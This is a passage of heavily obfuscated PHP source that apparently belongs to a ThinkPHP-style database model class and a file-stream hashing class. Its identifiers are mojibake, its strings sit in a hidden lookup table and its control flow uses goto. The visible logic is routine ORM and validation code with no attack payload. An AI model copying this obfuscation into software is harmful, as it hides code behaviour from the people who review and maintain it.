$‚åÇëì¯; $œòÆÌÓ = $this->_parseOptions($œòÆÌÓ); $‚åÇëì¯ = trim($‚åÇëì¯); if (strpos($‚åÇëì¯, $Á˜≈´∆Ï[50])) { if (!isset($œòÆÌÓ[$Á˜≈´∆Ï[378]])) { $œòÆÌÓ[$Á˜≈´∆Ï[378]] = is_numeric($»úåªúœ) ? $»úåªúœ : $Á˜≈´∆Ï[12]; } $Õﬁ∑ôÔù = $this->db->select($œòÆÌÓ); if (!empty($Õﬁ∑ôÔù)) { $˜óÔúıŸ = explode($Á˜≈´∆Ï[50], $‚åÇëì¯); $‚åÇëì¯ = array_keys($Õﬁ∑ôÔù[0]); $—øƒÊ£œ = array_shift($‚åÇëì¯); $√óÀàŸ = array_shift($‚åÇëì¯); $Ñ˙ï◊‘ê = array(); $ê¨—çÛç = count($˜óÔúıŸ); foreach ($Õﬁ∑ôÔù as $ªœπâÊØ) { $‘Ï¢é°‘ = $ªœπâÊØ[$—øƒÊ£œ]; if (2 == $ê¨—çÛç) { $Ñ˙ï◊‘ê[$‘Ï¢é°‘] = $ªœπâÊØ[$√óÀàŸ]; } else { $Ñ˙ï◊‘ê[$‘Ï¢é°‘] = is_string($»úåªúœ) ? implode($»úåªúœ, $ªœπâÊØ) : $ªœπâÊØ; } } return $Ñ˙ï◊‘ê; } } else { if (!0 !== $»úåªúœ) { $œòÆÌÓ[$Á˜≈´∆Ï[378]] = is_numeric($»úåªúœ) ? $»úåªúœ : 1; } if ($»úåªúœ === $Á˜≈´∆Ï[343]) { unset($œòÆÌÓ[$Á˜≈´∆Ï[378]]); } $ªœπâÊØ = $this->db->select($œòÆÌÓ); if (!empty($ªœπâÊØ)) { if ($»úåªúœ === $Á˜≈´∆Ï[343]) { return reset($ªœπâÊØ[0]); } if (!0 !== $»úåªúœ && 1 == $œòÆÌÓ[$Á˜≈´∆Ï[378]]) { return reset($ªœπâÊØ[0]); } foreach ($ªœπâÊØ as $ßÒƒ˘ûã) { $«›ø˚íΩ[] = $ßÒƒ˘ûã[$‚åÇëì¯]; } return $«›ø˚íΩ; } } return null; } public function create($†Ûã‰∞¨ = '', $∏˝ó¨≤’ = '') { $≤‘‡ﬁÙÊ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($†Ûã‰∞¨)) { $†Ûã‰∞¨ = $_POST; } elseif (is_object($†Ûã‰∞¨)) { $†Ûã‰∞¨ = get_object_vars($†Ûã‰∞¨); } if (empty($†Ûã‰∞¨) || !is_array($†Ûã‰∞¨)) { $this->error = think_lang($≤‘‡ﬁÙÊ[359]); return !1; } $†Ûã‰∞¨ = $this->parseFieldsMap($†Ûã‰∞¨, 0); $∏˝ó¨≤’ = $∏˝ó¨≤’ ? $∏˝ó¨≤’ : (!empty($†Ûã‰∞¨[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$≤‘‡ﬁÙÊ[361]])) { $ó≈îû≤ö = $this->options[$≤‘‡ﬁÙÊ[361]]; unset($this->options[$≤‘‡ﬁÙÊ[361]]); } elseif ($∏˝ó¨≤’ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ó≈îû≤ö = $this->insertFields; } elseif ($∏˝ó¨≤’ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ó≈îû≤ö = $this->updateFields; } if (isset($ó≈îû≤ö)) { if (is_string($ó≈îû≤ö)) { $ó≈îû≤ö = explode($≤‘‡ﬁÙÊ[50], $ó≈îû≤ö); } if (think_config($≤‘‡ﬁÙÊ[384])) { $ó≈îû≤ö[] = think_config($≤‘‡ﬁÙÊ[385]); } foreach ($†Ûã‰∞¨ as $˝ÚÉÂÙº => $„Öåáœ ) { if (!in_array($˝ÚÉÂÙº, $ó≈îû≤ö)) { unset($†Ûã‰∞¨[$˝ÚÉÂÙº]); } } } if (!$this->autoValidation($†Ûã‰∞¨, $∏˝ó¨≤’)) { return !1; } if (!$this->autoCheckToken($†Ûã‰∞¨)) { $this->error = think_lang($≤‘‡ﬁÙÊ[386]); return !1; } if ($this->autoCheckFields) { $ó≈îû≤ö = $this->getDbFields(); foreach ($†Ûã‰∞¨ as $˝ÚÉÂÙº => $„Öåáœ ) { if (!in_array($˝ÚÉÂÙº, $ó≈îû≤ö)) { unset($†Ûã‰∞¨[$˝ÚÉÂÙº]); } elseif (MAGIC_QUOTES_GPC && is_string($„Öåáœ )) { $†Ûã‰∞¨[$˝ÚÉÂÙº] = stripslashes($„Öåáœ ); } } } $this->autoOperation($†Ûã‰∞¨, $∏˝ó¨≤’); $this->data = $†Ûã‰∞¨; return $†Ûã‰∞¨; } public function autoCheckToken($ﬂÅ¿çõà) { $∞å∆π‰ñ =& $_SERVER[ˆë€Ï⁄∂]; if (isset($this->options[$∞å∆π‰ñ[387]]) && !$this->options[$∞å∆π‰ñ[387]]) { return !0; } if (think_config($∞å∆π‰ñ[384])) { $ÃçˆµÄ∫ = think_config($∞å∆π‰ñ[385]); if (!isset($ﬂÅ¿çõà[$ÃçˆµÄ∫]) || Session::get($ÃçˆµÄ∫)) { return !1; } list($˛ÔÓø˘÷, $Â–Ÿ«ÙÁ) = explode($∞å∆π‰ñ[11], $ﬂÅ¿çõà[$ÃçˆµÄ∫]); if ($Â–Ÿ«ÙÁ && Session::get($ÃçˆµÄ∫ . $∞å∆π‰ñ[10] . $˛ÔÓø˘÷) === $Â–Ÿ«ÙÁ) { Session::remove($ÃçˆµÄ∫ . $∞å∆π‰ñ[10] . $˛ÔÓø˘÷); return !0; } if (think_config($∞å∆π‰ñ[388])) { Session::remove($ÃçˆµÄ∫ . $∞å∆π‰ñ[10] . $˛ÔÓø˘÷); } return !1; } return !0; } public function regex($≤È˘·ùÉ, $Õ®÷é£¿) { $ëú§…∆ =& $_SERVER[ˆë€Ï⁄∂]; $êÖ˙∞˙‘ = array($ëú§…∆[389] => $ëú§…∆[390], $ëú§…∆[391] => $ëú§…∆[392], $ëú§…∆[393] => $ëú§…∆[394], $ëú§…∆[395] => $ëú§…∆[396], $ëú§…∆[397] => $ëú§…∆[398], $ëú§…∆[399] => $ëú§…∆[400], $ëú§…∆[401] => $ëú§…∆[402], $ëú§…∆[376] => $ëú§…∆[403], $ëú§…∆[404] => $ëú§…∆[405]); if (isset($êÖ˙∞˙‘[strtolower($Õ®÷é£¿)])) { $Õ®÷é£¿ = $êÖ˙∞˙‘[strtolower($Õ®÷é£¿)]; } return preg_match($Õ®÷é£¿, $≤È˘·ùÉ) === 1; } private function autoOperation(&$˛Î°“óö, $˙˚í’Æü) { $öõØÉ∑ê =& $_SERVER[ˆë€Ï⁄∂]; if (!empty($this->options[$öõØÉ∑ê[406]])) { $ ï”Àóø = $this->options[$öõØÉ∑ê[406]]; unset($this->options[$öõØÉ∑ê[406]]); } elseif (!empty($this->_auto)) { $ ï”Àóø = $this->_auto; } if (isset($ ï”Àóø)) { foreach ($ ï”Àóø as $ôéÆıü) { if (empty($ôéÆıü[2])) { $ôéÆıü[2] = THINK_MODEL_INSERT; } if ($˙˚í’Æü == $ôéÆıü[2] || $ôéÆıü[2] == THINK_MODEL_BOTH) { switch (trim($ôéÆıü[3])) { case $öõØÉ∑ê[407]: case $öõØÉ∑ê[408]: $ó≥Õ÷‚è = isset($ôéÆıü[4]) ? (array) $ôéÆıü[4] : array(); if (isset($˛Î°“óö[$ôéÆıü[0]])) { array_unshift($ó≥Õ÷‚è, $˛Î°“óö[$ôéÆıü[0]]); } if ($öõØÉ∑ê[407] == $ôéÆıü[3]) { $˛Î°“óö[$ôéÆıü[0]] = call_user_func_array($ôéÆıü[1], $ó≥Õ÷‚è); } else { $˛Î°“óö[$ôéÆıü[0]] = call_user_func_array(array(&$this, $ôéÆıü[1]), $ó≥Õ÷‚è); } break; case $öõØÉ∑ê[361]: $˛Î°“óö[$ôéÆıü[0]] = $˛Î°“óö[$ôéÆıü[1]]; break; case $öõØÉ∑ê[409]: if ($öõØÉ∑ê[12] === $˛Î°“óö[$ôéÆıü[0]]) { unset($˛Î°“óö[$ôéÆıü[0]]); } break; case $öõØÉ∑ê[410]: default: $˛Î°“óö[$ôéÆıü[0]] = $ôéÆıü[1]; } if (!1 === $˛Î°“óö[$ôéÆıü[0]]) { unset($˛Î°“óö[$ôéÆıü[0]]); } } } } return $˛Î°“óö; } protected function autoValidation($à˙ÉÑ‹ê, $Âß≤ª÷≠) { $Œ¢Ô¬¶å =& $_SERVER[ˆë€Ï⁄∂]; if (!empty($this->options[$Œ¢Ô¬¶å[411]])) { $‚˙˜·¬€ = $this->options[$Œ¢Ô¬¶å[411]]; unset($this->options[$Œ¢Ô¬¶å[411]]); } elseif (!empty($this->_validate)) { $‚˙˜·¬€ = $this->_validate; } if (isset($‚˙˜·¬€)) { if ($this->patchValidate) { $this->error = array(); } foreach ($‚˙˜·¬€ as $◊·∞ÃöΩ => $ùÅ√Úÿ¶) { if (empty($ùÅ√Úÿ¶[5]) || $ùÅ√Úÿ¶[5] == THINK_MODEL_BOTH || $ùÅ√Úÿ¶[5] == $Âß≤ª÷≠) { if (0 == strpos($ùÅ√Úÿ¶[2], $Œ¢Ô¬¶å[412]) && strpos($ùÅ√Úÿ¶[2], $Œ¢Ô¬¶å[413])) { $ùÅ√Úÿ¶[2] = think_lang(substr($ùÅ√Úÿ¶[2], 2, -1)); } $ùÅ√Úÿ¶[3] = isset($ùÅ√Úÿ¶[3]) ? $ùÅ√Úÿ¶[3] : THINK_EXISTS_VALIDATE; $ùÅ√Úÿ¶[4] = isset($ùÅ√Úÿ¶[4]) ? $ùÅ√Úÿ¶[4] : $Œ¢Ô¬¶å[414]; switch ($ùÅ√Úÿ¶[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($à˙ÉÑ‹ê, $ùÅ√Úÿ¶)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Œ¢Ô¬¶å[12] != trim($à˙ÉÑ‹ê[$ùÅ√Úÿ¶[0]])) { if (!1 === $this->_validationField($à˙ÉÑ‹ê, $ùÅ√Úÿ¶)) { return !1; } } break; default: if (isset($à˙ÉÑ‹ê[$ùÅ√Úÿ¶[0]])) { if (!1 === $this->_validationField($à˙ÉÑ‹ê, $ùÅ√Úÿ¶)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Æï€ü·¢, $ûµÔº∫–) { if (!1 === $this->_validationFieldItem($Æï€ü·¢, $ûµÔº∫–)) { if ($this->patchValidate) { $this->error[$ûµÔº∫–[0]] = $ûµÔº∫–[2]; } else { $this->error = $ûµÔº∫–[2]; return !1; } } return; } protected function _validationFieldItem($π≥Ø‡Ñ, $æ∂πúÅ∏) { $ãΩ∂ıå… =& $_SERVER[ˆë€Ï⁄∂]; switch (strtolower(trim($æ∂πúÅ∏[4]))) { case $ãΩ∂ıå…[407]: case $ãΩ∂ıå…[408]: $ﬁÙºº‚ﬂ = isset($æ∂πúÅ∏[6]) ? (array) $æ∂πúÅ∏[6] : array(); if (is_string($æ∂πúÅ∏[0]) && strpos($æ∂πúÅ∏[0], $ãΩ∂ıå…[50])) { $æ∂πúÅ∏[0] = explode($ãΩ∂ıå…[50], $æ∂πúÅ∏[0]); } if (is_array($æ∂πúÅ∏[0])) { foreach ($æ∂πúÅ∏[0] as $é‘ıáâ±) { $·î◊æåÄ[$é‘ıáâ±] = $π≥Ø‡Ñ[$é‘ıáâ±]; } array_unshift($ﬁÙºº‚ﬂ, $·î◊æåÄ); } else { array_unshift($ﬁÙºº‚ﬂ, $π≥Ø‡Ñ[$æ∂πúÅ∏[0]]); } if ($ãΩ∂ıå…[407] == $æ∂πúÅ∏[4]) { return call_user_func_array($æ∂πúÅ∏[1], $ﬁÙºº‚ﬂ); } else { return call_user_func_array(array(&$this, $æ∂πúÅ∏[1]), $ﬁÙºº‚ﬂ); } case $ãΩ∂ıå…[415]: return $π≥Ø‡Ñ[$æ∂πúÅ∏[0]] == $π≥Ø‡Ñ[$æ∂πúÅ∏[1]]; case $ãΩ∂ıå…[416]: if (is_string($æ∂πúÅ∏[0]) && strpos($æ∂πúÅ∏[0], $ãΩ∂ıå…[50])) { $æ∂πúÅ∏[0] = explode($ãΩ∂ıå…[50], $æ∂πúÅ∏[0]); } $ÑáﬂÚØ° = array(); if (is_array($æ∂πúÅ∏[0])) { foreach ($æ∂πúÅ∏[0] as $é‘ıáâ±) { $ÑáﬂÚØ°[$é‘ıáâ±] = $π≥Ø‡Ñ[$é‘ıáâ±]; } } else { $ÑáﬂÚØ°[$æ∂πúÅ∏[0]] = $π≥Ø‡Ñ[$æ∂πúÅ∏[0]]; } if (!empty($π≥Ø‡Ñ[$this->getPk()])) { $ÑáﬂÚØ°[$this->getPk()] = array($ãΩ∂ıå…[417], $π≥Ø‡Ñ[$this->getPk()]); } if ($this->where($ÑáﬂÚØ°)->find()) { return !1; } return !0; default: return $this->check($π≥Ø‡Ñ[$æ∂πúÅ∏[0]], $æ∂πúÅ∏[1], $æ∂πúÅ∏[4]); } } public function check($ﬁ¥¯Ωé , $ﬁÛüÍäË, $«…ÑÂ¿« = "\x72\145\147\145\170") { $ÁŒ÷‚⁄ =& $_SERVER[ˆë€Ï⁄∂]; $«…ÑÂ¿« = strtolower(trim($«…ÑÂ¿«)); switch ($«…ÑÂ¿«) { case $ÁŒ÷‚⁄[7]: case $ÁŒ÷‚⁄[418]: $›™∂π ƒ = is_array($ﬁÛüÍäË) ? $ﬁÛüÍäË : explode($ÁŒ÷‚⁄[50], $ﬁÛüÍäË); return $«…ÑÂ¿« == $ÁŒ÷‚⁄[7] ? in_array($ﬁ¥¯Ωé , $›™∂π ƒ) : !in_array($ﬁ¥¯Ωé , $›™∂π ƒ); case $ÁŒ÷‚⁄[419]: case $ÁŒ÷‚⁄[420]: if (is_array($ﬁÛüÍäË)) { $™”∞ñÎê = $ﬁÛüÍäË[0]; $™≥Õå¥å = $ﬁÛüÍäË[1]; } else { list($™”∞ñÎê, $™≥Õå¥å) = explode($ÁŒ÷‚⁄[50], $ﬁÛüÍäË); } return $«…ÑÂ¿« == $ÁŒ÷‚⁄[419] ? $ﬁ¥¯Ωé  >= $™”∞ñÎê && $ﬁ¥¯Ωé  <= $™≥Õå¥å : $ﬁ¥¯Ωé  < $™”∞ñÎê || $ﬁ¥¯Ωé  > $™≥Õå¥å; case $ÁŒ÷‚⁄[421]: case $ÁŒ÷‚⁄[422]: return $«…ÑÂ¿« == $ÁŒ÷‚⁄[421] ? $ﬁ¥¯Ωé  == $ﬁÛüÍäË : $ﬁ¥¯Ωé  != $ﬁÛüÍäË; case $ÁŒ÷‚⁄[423]: $Èë¿ƒÖà = mb_strlen($ﬁ¥¯Ωé , $ÁŒ÷‚⁄[424]); if (strpos($ﬁÛüÍäË, $ÁŒ÷‚⁄[50])) { list($™”∞ñÎê, $™≥Õå¥å) = explode($ÁŒ÷‚⁄[50], $ﬁÛüÍäË); return $Èë¿ƒÖà >= $™”∞ñÎê && $Èë¿ƒÖà <= $™≥Õå¥å; } else { return $Èë¿ƒÖà == $ﬁÛüÍäË; } case $ÁŒ÷‚⁄[425]: list($πÁœõ∑«, $„∫ÚÒ±Á) = explode($ÁŒ÷‚⁄[50], $ﬁÛüÍäË); if (!is_numeric($πÁœõ∑«)) { $πÁœõ∑« = strtotime($πÁœõ∑«); } if (!is_numeric($„∫ÚÒ±Á)) { $„∫ÚÒ±Á = strtotime($„∫ÚÒ±Á); } return NOW_TIME >= $πÁœõ∑« && NOW_TIME <= $„∫ÚÒ±Á; case $ÁŒ÷‚⁄[426]: return in_array(get_client_ip(), explode($ÁŒ÷‚⁄[50], $ﬁÛüÍäË)); case $ÁŒ÷‚⁄[427]: return !in_array(get_client_ip(), explode($ÁŒ÷‚⁄[50], $ﬁÛüÍäË)); case $ÁŒ÷‚⁄[414]: default: return $this->regex($ﬁ¥¯Ωé , $ﬁÛüÍäË); } } public function query($è´Ó∑º‡, $Òâ‘óü† = false) { $«˝—ïÄ¶ =& $_SERVER[ˆë€Ï⁄∂]; if (!is_bool($Òâ‘óü†) && !is_array($Òâ‘óü†)) { $Òâ‘óü† = func_get_args(); array_shift($Òâ‘óü†); } $è´Ó∑º‡ = str_replace(array($«˝—ïÄ¶[59], $«˝—ïÄ¶[428]), $«˝—ïÄ¶[53], $è´Ó∑º‡); $è´Ó∑º‡ = $this->parseSql($è´Ó∑º‡, $Òâ‘óü†); return $this->db->query($è´Ó∑º‡); } public function execute($≥±Ûò±õ, $„•±¨î£ = false) { if (!is_bool($„•±¨î£) && !is_array($„•±¨î£)) { $„•±¨î£ = func_get_args(); array_shift($„•±¨î£); } $≥±Ûò±õ = $this->parseSql($≥±Ûò±õ, $„•±¨î£); return $this->db->execute($≥±Ûò±õ); } protected function parseSql($ôØﬂ–€∆, $ìå˘∫åæ) { $ƒÇìíÌ‹ =& $_SERVER[ˆë€Ï⁄∂]; if (!0 === $ìå˘∫åæ) { $¿∏ö≥◊∆ = $this->_parseOptions(); $ôØﬂ–€∆ = $this->db->parseSql($ôØﬂ–€∆, $¿∏ö≥◊∆); } elseif (is_array($ìå˘∫åæ)) { $ìå˘∫åæ = array_map(array($this->db, $ƒÇìíÌ‹[429]), $ìå˘∫åæ); $ôØﬂ–€∆ = vsprintf($ôØﬂ–€∆, $ìå˘∫åæ); } else { $ôØﬂ–€∆ = strtr($ôØﬂ–€∆, array($ƒÇìíÌ‹[430] => $this->getTableName(), $ƒÇìíÌ‹[431] => think_config($ƒÇìíÌ‹[332]))); } $this->db->setModel($this->name); return $ôØﬂ–€∆; } public function db($‘ﬁö¥∆¨ = '', $‰Â‘˙Ùﬂ = '', $ùö¬Ãöì = array()) { $ÌÉÊïÃ† =& $_SERVER[ˆë€Ï⁄∂]; if ($ÌÉÊïÃ†[12] === $‘ﬁö¥∆¨ && $this->db) { return $this->db; } static $Ô˘›´˛Ë = array(); static $¬¢ú∆Á = array(); if (!isset($¬¢ú∆Á[$‘ﬁö¥∆¨]) || isset($¬¢ú∆Á[$‘ﬁö¥∆¨]) && $‰Â‘˙Ùﬂ && $Ô˘›´˛Ë[$‘ﬁö¥∆¨] != $‰Â‘˙Ùﬂ) { if (!empty($‰Â‘˙Ùﬂ) && is_string($‰Â‘˙Ùﬂ) && !1 === strpos($‰Â‘˙Ùﬂ, $ÌÉÊïÃ†[8])) { $‰Â‘˙Ùﬂ = think_config($‰Â‘˙Ùﬂ); } $‘ﬁö¥∆¨ = think_guid($‰Â‘˙Ùﬂ); $¬¢ú∆Á[$‘ﬁö¥∆¨] = Db::getInstance($‰Â‘˙Ùﬂ); } elseif (NULL === $‰Â‘˙Ùﬂ) { $¬¢ú∆Á[$‘ﬁö¥∆¨]->close(); unset($¬¢ú∆Á[$‘ﬁö¥∆¨]); return; } if (!empty($ùö¬Ãöì)) { if (is_string($ùö¬Ãöì)) { parse_str($ùö¬Ãöì, $ùö¬Ãöì); } foreach ($ùö¬Ãöì as $éÏ≠Çôü => $áÕôñ—ƒ) { $this->setProperty($éÏ≠Çôü, $áÕôñ—ƒ); } } $Ô˘›´˛Ë[$‘ﬁö¥∆¨] = $‰Â‘˙Ùﬂ; $this->db = $¬¢ú∆Á[$‘ﬁö¥∆¨]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Ê‘ﬁ–ÿÜ = get_class($this); if ($Ê‘ﬁ–ÿÜ == $_SERVER[ˆë€Ï⁄∂][432]) { return $this->name; } $this->name = substr($Ê‘ﬁ–ÿÜ, 0, -5); } return $this->name; } public function getTableName() { $õ Á∏®® =& $_SERVER[ˆë€Ï⁄∂]; if (empty($this->trueTableName)) { $ÂöêÍ¥Ô = !empty($this->tablePrefix) ? $this->tablePrefix : $õ Á∏®®[12]; if (!empty($this->tableName)) { $ÂöêÍ¥Ô .= $this->tableName; } else { $ÂöêÍ¥Ô .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÂöêÍ¥Ô); } return (!empty($this->dbName) ? $this->dbName . $õ Á∏®®[10] : $õ Á∏®®[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Úõ£°£¢ =& $_SERVER[ˆë€Ï⁄∂]; return isset($this->fields[$Úõ£°£¢[339]]) ? $this->fields[$Úõ£°£¢[339]] : $this->pk; } public function getDbFields() { $Ω∂¡û§™ =& $_SERVER[ˆë€Ï⁄∂]; if (isset($this->options[$Ω∂¡û§™[367]])) { $Ø øî“˚ = $this->db->getFields($this->options[$Ω∂¡û§™[367]]); return $Ø øî“˚ ? array_keys($Ø øî“˚) : !1; } if ($this->fields) { $Ø øî“˚ = $this->fields; unset($Ø øî“˚[$Ω∂¡û§™[338]], $Ø øî“˚[$Ω∂¡û§™[339]], $Ø øî“˚[$Ω∂¡û§™[340]], $Ø øî“˚[$Ω∂¡û§™[337]]); return $Ø øî“˚; } return !1; } public function data($ìúΩ÷íê = '') { $∑∞á”ß‹ =& $_SERVER[ˆë€Ï⁄∂]; if ($∑∞á”ß‹[12] === $ìúΩ÷íê && !empty($this->data)) { return $this->data; } if (is_object($ìúΩ÷íê)) { $ìúΩ÷íê = get_object_vars($ìúΩ÷íê); } elseif (is_string($ìúΩ÷íê)) { parse_str($ìúΩ÷íê, $ìúΩ÷íê); } elseif (!is_array($ìúΩ÷íê)) { think_exception(think_lang($∑∞á”ß‹[359])); } $this->data = $ìúΩ÷íê; return $this; } public function join($‘“Ø—Áü) { $æüÎ÷¸‹ =& $_SERVER[ˆë€Ï⁄∂]; if (is_array($‘“Ø—Áü)) { $this->options[$æüÎ÷¸‹[370]] = $‘“Ø—Áü; } elseif (!empty($‘“Ø—Áü)) { $this->options[$æüÎ÷¸‹[370]][] = $‘“Ø—Áü; } return $this; } public function union($¯ı∆…º‘, $˝Åö‹ŸÙ = false) { $Õçª˘øú =& $_SERVER[ˆë€Ï⁄∂]; if (empty($¯ı∆…º‘)) { return $this; } if ($˝Åö‹ŸÙ) { $this->options[$Õçª˘øú[433]][$Õçª˘øú[434]] = !0; } if (is_object($¯ı∆…º‘)) { $¯ı∆…º‘ = get_object_vars($¯ı∆…º‘); } if (is_string($¯ı∆…º‘)) { $Á€·¡Æª = $¯ı∆…º‘; } elseif (is_array($¯ı∆…º‘)) { if (isset($¯ı∆…º‘[0])) { $this->options[$Õçª˘øú[433]] = array_merge($this->options[$Õçª˘øú[433]], $¯ı∆…º‘); return $this; } else { $Á€·¡Æª = $¯ı∆…º‘; } } else { think_exception(think_lang($Õçª˘øú[359])); } $this->options[$Õçª˘øú[433]][] = $Á€·¡Æª; return $this; } public function cache($ôñüë ç = true, $ë˝€±û± = null, $Ê◊®∂¸» = '') { $ ÜÛÓ¬Ë =& $_SERVER[ˆë€Ï⁄∂]; if (!1 !== $ôñüë ç) { $this->options[$ ÜÛÓ¬Ë[435]] = array($ ÜÛÓ¬Ë[107] => $ôñüë ç, $ ÜÛÓ¬Ë[425] => $ë˝€±û±, $ ÜÛÓ¬Ë[33] => $Ê◊®∂¸»); } return $this; } public function field($‘Ñıœ±ì, $‹Û÷§å¸ = false) { $ùÚƒ¢¡≈ =& $_SERVER[ˆë€Ï⁄∂]; if (!0 === $‘Ñıœ±ì) { $ª⁄ñè Ò = $this->getDbFields(); $‘Ñıœ±ì = $ª⁄ñè Ò ? $ª⁄ñè Ò : $ùÚƒ¢¡≈[232]; } elseif ($‹Û÷§å¸) { if (is_string($‘Ñıœ±ì)) { $‘Ñıœ±ì = explode($ùÚƒ¢¡≈[50], $‘Ñıœ±ì); } $ª⁄ñè Ò = $this->getDbFields(); $‘Ñıœ±ì = $ª⁄ñè Ò ? array_diff($ª⁄ñè Ò, $‘Ñıœ±ì) : $‘Ñıœ±ì; } $this->options[$ùÚƒ¢¡≈[361]] = $‘Ñıœ±ì; return $this; } public function scope($äËÇ¬⁄Ü = '', $¶‚¶ΩóΩ = NULL) { $º¬ˆΩ≠ö =& $_SERVER[ˆë€Ï⁄∂]; if ($º¬ˆΩ≠ö[12] === $äËÇ¬⁄Ü) { if (isset($this->_scope[$º¬ˆΩ≠ö[37]])) { $˙ı˚ä« = $this->_scope[$º¬ˆΩ≠ö[37]]; } else { return $this; } } elseif (is_string($äËÇ¬⁄Ü)) { $ÏŒ¶˜ÆÆ = explode($º¬ˆΩ≠ö[50], $äËÇ¬⁄Ü); $˙ı˚ä« = array(); foreach ($ÏŒ¶˜ÆÆ as $®˛∏∆¢¢) { if (!isset($this->_scope[$®˛∏∆¢¢])) { continue; } $˙ı˚ä« = array_merge($˙ı˚ä«, $this->_scope[$®˛∏∆¢¢]); } if (!empty($¶‚¶ΩóΩ) && is_array($¶‚¶ΩóΩ)) { $˙ı˚ä« = array_merge($˙ı˚ä«, $¶‚¶ΩóΩ); } } elseif (is_array($äËÇ¬⁄Ü)) { $˙ı˚ä« = $äËÇ¬⁄Ü; } if (is_array($˙ı˚ä«) && !empty($˙ı˚ä«)) { $this->options = array_merge($this->options, array_change_key_case($˙ı˚ä«)); } return $this; } public function where($„ú◊ï–, $øÊ…é«å = null) { $Ωà≠•õÖ =& $_SERVER[ˆë€Ï⁄∂]; if (!is_null($øÊ…é«å) && is_string($„ú◊ï–)) { if (!is_array($øÊ…é«å)) { $øÊ…é«å = func_get_args(); array_shift($øÊ…é«å); } $øÊ…é«å = array_map(array($this->db, $Ωà≠•õÖ[429]), $øÊ…é«å); $„ú◊ï– = vsprintf($„ú◊ï–, $øÊ…é«å); } elseif (is_object($„ú◊ï–)) { $„ú◊ï– = get_object_vars($„ú◊ï–); } elseif (is_array($„ú◊ï–)) { foreach ($„ú◊ï– as $è˝¯ôÄÁ => $Èˆ¢ﬁ“ú) { if ((is_numeric($è˝¯ôÄÁ) || !$è˝¯ôÄÁ) && is_string($Èˆ¢ﬁ“ú)) { if (strpos($Èˆ¢ﬁ“ú, $Ωà≠•õÖ[436]) === 0) { continue; } think_trace($Ωà≠•õÖ[437], $Ωà≠•õÖ[12], $Ωà≠•õÖ[49]); die; } } } if (is_string($„ú◊ï–) && $Ωà≠•õÖ[12] != $„ú◊ï–) { $î‰π˝ˆ˝ = array(); $î‰π˝ˆ˝[$Ωà≠•õÖ[438]] = $„ú◊ï–; $„ú◊ï– = $î‰π˝ˆ˝; } if (isset($this->options[$Ωà≠•õÖ[363]])) { $this->options[$Ωà≠•õÖ[363]] = array_merge($this->options[$Ωà≠•õÖ[363]], $„ú◊ï–); } else { $this->options[$Ωà≠•õÖ[363]] = $„ú◊ï–; } return $this; } public function limit($í∆í÷Æ˝, $ËÃî«á” = null) { $Ã∑Ô“≤Ù =& $_SERVER[ˆë€Ï⁄∂]; $this->options[$Ã∑Ô“≤Ù[378]] = is_null($ËÃî«á”) ? $í∆í÷Æ˝ : $í∆í÷Æ˝ . $Ã∑Ô“≤Ù[50] . $ËÃî«á”; return $this; } public function page($ëªÒòó∆, $Á•ƒΩ◊‡ = null) { $˛†ÇæŒÿ =& $_SERVER[ˆë€Ï⁄∂]; $this->options[$˛†ÇæŒÿ[439]] = is_null($Á•ƒΩ◊‡) ? $ëªÒòó∆ : $ëªÒòó∆ . $˛†ÇæŒÿ[50] . $Á•ƒΩ◊‡; return $this; } public function comment($„‚ﬂ◊Ûõ) { $this->options[$_SERVER[ˆë€Ï⁄∂][440]] = $„‚ﬂ◊Ûõ; return $this; } public function setProperty($›°ÚˆÏ‘, $õÈ˚¿«¡) { if (property_exists($this, $›°ÚˆÏ‘)) { $this->{$›°ÚˆÏ‘} = $õÈ˚¿«¡; } return $this; } } goto D»øÕ∆äÍŒ; cÔ¥üëıé®: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($˜õ™õ©¿, $·¥ã•ö¯ = 0) { parent::__construct(); $this->source = $˜õ™õ©¿; $this->sourceSize = $·¥ã•ö¯; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‘©Á€±ä = false) { return $this->sourceSize; } public function getContent($‰Ó∞≠Ü∆ = false) { return $this->fileSubstr($‰Ó∞≠Ü∆, 0, $this->sourceSize); } public function fileSubstr($èÃ’Ù›˝ = false, $ÿıÅƒ”È = 0, $›˘©´ñ‚ = 0) { if (!$›˘©´ñ‚) { $›˘©´ñ‚ = $this->sourceSize; } $ÈøÜ≤Õê = $this->sourceSize - $ÿıÅƒ”È; if ($›˘©´ñ‚ >= $ÈøÜ≤Õê) { $›˘©´ñ‚ = $ÈøÜ≤Õê; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÿıÅƒ”È, $›˘©´ñ‚); } if ($this->sourceType == self::TYPE_FILE) { if ($›˘©´ñ‚ <= 0) { return $_SERVER[ˆë€Ï⁄∂][12]; } $Ê §ÈùÍ = ftell($this->source); fseek_64($this->source, $Ê §ÈùÍ + $ÿıÅƒ”È); $ﬁ∑•‰ó˛ = @fread($this->source, $›˘©´ñ‚); fseek_64($this->source, $Ê §ÈùÍ); return $ﬁ∑•‰ó˛; } } public function hashMd5($∆·Üï‚Î = false) { return md5($this->getContent()); } public static function hash($Ã›ç∆◊ö, $˚“Íïäã = 0) { $–ÊÇ™ŸÆ = new PathDriverStream($Ã›ç∆◊ö, $˚“Íïäã); return $–ÊÇ™ŸÆ->hashSimple($Ã›ç∆◊ö); } public static function md5($âÍ•˙™˝, $¸‚õ‰¥Ñ = 0) { 